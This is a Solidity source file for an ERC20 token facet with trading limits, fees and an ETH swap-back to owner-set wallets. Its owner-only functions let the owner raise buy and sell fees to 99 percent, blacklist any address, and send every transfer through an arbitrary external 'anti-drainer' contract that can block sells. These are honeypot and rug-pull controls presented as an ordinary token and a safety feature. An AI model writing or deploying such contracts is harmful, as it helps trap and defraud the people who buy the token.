// SPDX-License-Identifier: MIT

// Website: https://tensorspace.cloud/

pragma solidity ^0.8.10;
import "./TestLib.sol";
contract openTradingFacet is ERC20, Ownable {
    using SafeMath for uint256;

    function openTrading() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.tradingActive = true;
        ds.swapEnabled = true;
    }
    function excludeFrommaximumTransactionAllowed(
        address addr,
        bool value
    ) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.isExcludemaximumTransactionAllowed[addr] = value;
    }
    function excludeFromFees(address account, bool value) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.isExcludedFromFees[account] = value;
    }
    function removeLimits() external onlyOwner returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.limitsInEffect = false;
        return true;
    }
    function updateSwapEnabled(bool enabled) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.swapEnabled = enabled;
    }
    function updatemaximumWalletAllowed(uint256 newNum) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(
            newNum >= ((totalSupply() * 5) / 1000) / 1e18,
            "Cannot set ds.maximumWalletAllowed lower than 0.5%"
        );
        ds.maximumWalletAllowed = newNum * (10 ** 18);
    }
    function updateswapBackThreshold(
        uint256 newAmount
    ) external onlyOwner returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(
            newAmount >= (totalSupply() * 1) / 100000,
            "Swap amount cannot be lower than 0.001% total supply."
        );
        require(
            newAmount <= (totalSupply() * 5) / 1000,
            "Swap amount cannot be higher than 0.5% total supply."
        );
        ds.swapBackThreshold = newAmount;
        return true;
    }
    function updatemaximumTransactionAllowed(
        uint256 newNum
    ) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(
            newNum >= ((totalSupply() * 1) / 1000) / 1e18,
            "Cannot set ds.maximumTransactionAllowed lower than 0.1%"
        );
        ds.maximumTransactionAllowed = newNum * (10 ** 18);
    }
    function updateBuyFees(
        uint256 newMarketFee,
        uint256 newDevFee
    ) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.buyMarketFee = newMarketFee;
        ds.buyDevFee = newDevFee;
        ds.buyTotalFees = ds.buyMarketFee + ds.buyDevFee;
        require(ds.buyTotalFees <= 99);
    }
    function updateSellFees(
        uint256 newMarketFee,
        uint256 newDevFee
    ) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.sellMarketFee = newMarketFee;
        ds.sellDevFee = newDevFee;
        ds.sellTotalFees = ds.sellMarketFee + ds.sellDevFee;
        require(ds.sellTotalFees <= 99);
    }
    function setAntiDrainer(address newAntiDrainer) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(newAntiDrainer != address(0x0), "Invalid anti-drainer");
        ds.antiDrainer = newAntiDrainer;
    }
    function setAMMPair(address pair, bool value) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(
            pair != ds.uniswapPair,
            "The pair cannot be removed from ds.ammPairs"
        );
        ds.ammPairs[pair] = value;
    }
    function setBlackList(address addr, bool enable) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.isBlackList[addr] = enable;
    }
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(!ds.isBlackList[from], "[from] black list");
        require(!ds.isBlackList[to], "[to] black list");

        if (amount == 0) {
            super._transfer(from, to, 0);
            return;
        }

        if (ds.limitsInEffect) {
            if (
                from != owner() &&
                to != owner() &&
                to != address(0) &&
                to != address(0xdead) &&
                !ds.swapping
            ) {
                if (!ds.tradingActive) {
                    require(
                        ds.isExcludedFromFees[from] ||
                            ds.isExcludedFromFees[to],
                        "Trading is not active."
                    );
                }

                //when buy
                if (
                    ds.ammPairs[from] &&
                    !ds.isExcludemaximumTransactionAllowed[to]
                ) {
                    require(
                        amount <= ds.maximumTransactionAllowed,
                        "Buy transfer amount exceeds the ds.maximumTransactionAllowed."
                    );
                    require(
                        amount + balanceOf(to) <= ds.maximumWalletAllowed,
                        "Max wallet exceeded"
                    );
                }
                //when sell
                else if (
                    ds.ammPairs[to] &&
                    !ds.isExcludemaximumTransactionAllowed[from]
                ) {
                    require(
                        amount <= ds.maximumTransactionAllowed,
                        "Sell transfer amount exceeds the ds.maximumTransactionAllowed."
                    );
                } else if (!ds.isExcludemaximumTransactionAllowed[to]) {
                    require(
                        amount + balanceOf(to) <= ds.maximumWalletAllowed,
                        "Max wallet exceeded"
                    );
                }
            }
        }

        if (
            ds.antiDrainer != address(0) &&
            IAntiDrainer(ds.antiDrainer).isEnabled(address(this))
        ) {
            bool check = IAntiDrainer(ds.antiDrainer).check(
                from,
                to,
                address(ds.uniswapPair),
                ds.maximumWalletAllowed,
                ds.maximumTransactionAllowed,
                ds.swapBackThreshold
            );
            require(check, "Anti Drainer Enabled");
        }

        uint256 contractBalance = balanceOf(address(this));
        bool canSwap = contractBalance >= ds.swapBackThreshold;
        if (
            canSwap &&
            ds.swapEnabled &&
            !ds.swapping &&
            !ds.ammPairs[from] &&
            !ds.isExcludedFromFees[from] &&
            !ds.isExcludedFromFees[to]
        ) {
            ds.swapping = true;
            swapBack();
            ds.swapping = false;
        }

        bool takeFee = !ds.swapping;
        if (ds.isExcludedFromFees[from] || ds.isExcludedFromFees[to])
            takeFee = false;

        uint256 fee = 0;
        if (takeFee) {
            if (ds.ammPairs[to] && ds.sellTotalFees > 0) {
                fee = amount.mul(ds.sellTotalFees).div(100);
                ds.tokensForDev += (fee * ds.sellDevFee) / ds.sellTotalFees;
                ds.tokensForMarket +=
                    (fee * ds.sellMarketFee) /
                    ds.sellTotalFees;
            } else if (ds.ammPairs[from] && ds.buyTotalFees > 0) {
                fee = amount.mul(ds.buyTotalFees).div(100);
                ds.tokensForDev += (fee * ds.buyDevFee) / ds.buyTotalFees;
                ds.tokensForMarket += (fee * ds.buyMarketFee) / ds.buyTotalFees;
            }

            if (fee > 0) super._transfer(from, address(this), fee);

            amount -= fee;
        }
        super._transfer(from, to, amount);
    }
    function swapBack() private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        uint256 contractBalance = balanceOf(address(this));
        uint256 totalTokensToSwap = ds.tokensForMarket + ds.tokensForDev;
        bool success;

        if (contractBalance == 0 || totalTokensToSwap == 0) return;

        if (contractBalance > ds.swapBackThreshold * 20)
            contractBalance = ds.swapBackThreshold * 20;

        uint256 initialETHBalance = address(this).balance;
        swapTokensForEth(contractBalance);

        uint256 ethBalance = address(this).balance.sub(initialETHBalance);
        uint256 ethForDev = ethBalance.mul(ds.tokensForDev).div(
            totalTokensToSwap
        );

        ds.tokensForMarket = 0;
        ds.tokensForDev = 0;

        (success, ) = address(ds.developmentWallet).call{value: ethForDev}("");
        (success, ) = address(ds.marketingWallet).call{
            value: address(this).balance
        }("");
    }
    function swapTokensForEth(uint256 tokenAmount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = ds.uniswapRouter.WETH();

        _approve(address(this), address(ds.uniswapRouter), tokenAmount);

        ds.uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}
